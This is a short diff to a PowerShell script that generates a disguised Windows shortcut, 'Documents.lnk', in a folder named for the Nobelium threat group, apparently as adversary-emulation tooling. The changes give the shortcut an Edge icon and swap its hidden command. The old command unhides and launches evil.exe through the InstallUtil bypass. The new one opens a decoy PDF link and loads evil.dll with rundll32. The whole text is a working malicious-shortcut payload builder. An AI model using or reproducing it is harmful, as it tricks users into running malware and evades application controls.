@@ -6,7 +6,7 @@ $link = $obj.createshortcut("c:\payloads\nobelium\Documents.lnk")
 $link.windowstyle = "7"
 $link.targetpath = "C:\Windows\System32\cmd.exe"
 # predefined lnk icon
-#$link.iconlocation = "C:\windows\system32\notepad.exe"
+$link.iconlocation = "C:\program files (x86)\microsoft\edge\application\msedge, 13"
 # command to execute
-$link.arguments = "/c attrib -h evil.exe  && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U evil.exe  && attrib +h evil.exe && start c:\"
+$link.arguments = '/c "start https://example.com/legit.pdf && rundll32 .\evil.dll,DllMain"'
 $link.save()
